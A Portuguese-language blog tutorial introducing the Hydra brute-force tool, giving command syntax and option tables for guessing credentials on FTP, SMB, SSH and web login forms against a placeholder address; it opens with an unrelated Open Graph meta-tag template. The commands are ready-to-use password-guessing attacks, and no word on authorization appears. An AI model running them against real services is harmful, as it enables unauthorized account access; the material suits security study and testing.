---
layout: post
title: Hydra Brute Force
author: 'Antony Leite'
date: 2020-07-22 12:00:00 -0300
lide: Uma pequena introdução a essa excelente ferramenta de Brute Force.
---


```html
<!-- Social: Facebook / Open Graph -->
<meta property="fb:admins" content="id do seu fb insight">
<meta property="og:url" content="url do seu site">
<meta property="og:type" content="tipo do link, article, page, etc">
<meta property="og:title" content="título do site">
<meta property="og:image" content="imagem do site (LINK ABSOLUTO)">
<meta property="og:description" content="breve descrição">
<meta property="og:site_name" content="Nome do site">
<meta property="article:author" content="fb de quem escreveu">
<meta property="article:publisher" content="fb de quem publicou">
<meta property="article:published_time" content="momento de publicação">
<meta property="article:tag" content="tag1">
<meta property="article:tag" content="tag2">
```

## Hydra Brute Force.

Basicamente o Hydra utiliza o método de brute force (tentativa e erro) para descobrir senhas. Ela faz uso de dicionários que contem diversas variedades e combinações de senhas e de logins. Essa ferramenta tem suporte para diversos protocolos, tais como FTP, SMB, SSH, MySQL, formulários web entre outros. Nesse breve introdução, vamos abordar o uso do Hydra nos serviços de FTP, SMB e SSH e formulário web.

Lembrando que você pode rodar o comando **`$ hydra -h`** que você ira ver a opção de ajuda do Hydra.

## Hydra FTP

FTP (*File Transfer Protocol*) é protocolo de transferência de arquivos. Um dos mais antigos em uso hoje em dia.

Para usar o Hydra em alguns serviço FTP basta seguir a sintaxe abaixo:

**`hydra -L <dicionário de usuários.txt> -P <dicionário de senhas.txt> ftp://10.10.10.10`**

Ou

**`hydra -l <usuário> -p <senha> ftp://10.10.10.10`**

<table class="table">
  <thead>
    <tr>
      <th scope="col">Opção</th>
      <th scope="col">Descrição</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-l</td>
      <td>Setar um único usuário</td>
    </tr>
    <tr>
      <td>-L</td>
      <td>Setar um dicionário de usuários</td>
    </tr>
    <tr>
      <td>-p</td>
      <td>Setar uma unica senha</td>
    </tr>
    <tr>
      <td>-P</td>
      <td>Setar um dicionário de senhas</td>
    </tr>
  </tbody>
</table>


## Hydra SMB


SMB (*Server Message Block*) é é um protocolo para compartilhar arquivos, impressoras, portas seriais e abstrações de comunicações, um servidor cliente, protocolo de solicitação-resposta.

**`hydra -L <dicionário de usuários.txt> -P <dicionário de senhas.txt> 10.10.10.10 smb`**

<table class="table">
  <thead>
    <tr>
      <th scope="col">Opção</th>
      <th scope="col">Descrição</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-L</td>
      <td>Setar um dicionário de usuários</td>
    </tr>
    <tr>
      <td>-P</td>
      <td>Setar um dicionário de senhas</td>
    </tr>
    <tr>
      <td>smb</td>
      <td>Protocolo</td>
    </tr>
  </tbody>
</table>

## Hydra SSH

Secure Shell (*SSH*) é geralmente usado para acessar sistemas operacionais semelhantes ao Unix, mas também pode ser usado no Microsoft Windows. O Windows 10 usa o OpenSSH como seu cliente SSH padrão e servidor SSH.

Para usar o Hydra no serviço de SSH basta seguir a sintaxe abaixo:

**`$ hydra -L <dicionário de usuários.txt> -P <dicionário de senhas.txt> 10.10.10.10 ssh`**

<table class="table">
  <thead>
    <tr>
      <th scope="col">Opção</th>
      <th scope="col">Descrição</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-L</td>
      <td>Setar um dicionário de usuários</td>
    </tr>
    <tr>
      <td>-P</td>
      <td>Setar um dicionário de senhas</td>
    </tr>
    <tr>
      <td>ssh</td>
      <td>Protocolo</td>
    </tr>
  </tbody>
</table>


## Hydra Formulários Web

Podemos usar o Hydra para Brute Force em formulários web, porém você terá  que saber qual tipo de solicitação que o site esta fazendo, se é o método GET ou POST. Para você saber qual método o site está solicitando você pode fazer uso das ferramentas de desenvolvedor do seu navegador.

Você pode usar o seguinte comando para o método POST:

**`hydra -L <dicionário de usuários.txt> -P <dicionário de senhas.txt> 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`**

<table class="table">
  <thead>
    <tr>
      <th scope="col">Opção</th>
      <th scope="col">Descrição</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-L</td>
      <td>Setar um dicionário de usuários</td>
    </tr>
    <tr>
      <td>-P</td>
      <td>Setar um dicionário de senhas</td>
    </tr>
    <tr>
      <td>http-post-form</td>
      <td>Protocolo</td>
    </tr>
  </tbody>
</table>

E o seguinte comando para o método GET:

**`hydra -L <dicionário de usuários.txt> -P <dicionário de senhas.txt> 10.10.10.10 http-get-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`**

<table class="table">
  <thead>
    <tr>
      <th scope="col">Opção</th>
      <th scope="col">Descrição</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-L</td>
      <td>Setar um dicionário de usuários</td>
    </tr>
    <tr>
      <td>-P</td>
      <td>Setar um dicionário de senhas</td>
    </tr>
    <tr>
      <td>http-get-form</td>
      <td>Protocolo</td>
    </tr>
  </tbody>
</table>

## Observação!

Saiba que você pode pode mesclar as opções, elas variam de acordo com sua necessidade. Vamos supor que você já tem o usuário do SSH e quer somente descobrir a senha, basta você usar seguinte comando:

**`$ hydra -l <usuário> -P <dicionário de senhas.txt> 10.10.10.10 ssh`**

<table class="table">
  <thead>
    <tr>
      <th scope="col">Opção</th>
      <th scope="col">Descrição</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-l</td>
      <td>Setar um único usuário</td>
    </tr>
    <tr>
      <td>-P</td>
      <td>Setar um dicionário de senhas</td>
    </tr>
    <tr>
      <td>ssh</td>
      <td>Protocolo</td>
    </tr>
  </tbody>
</table>
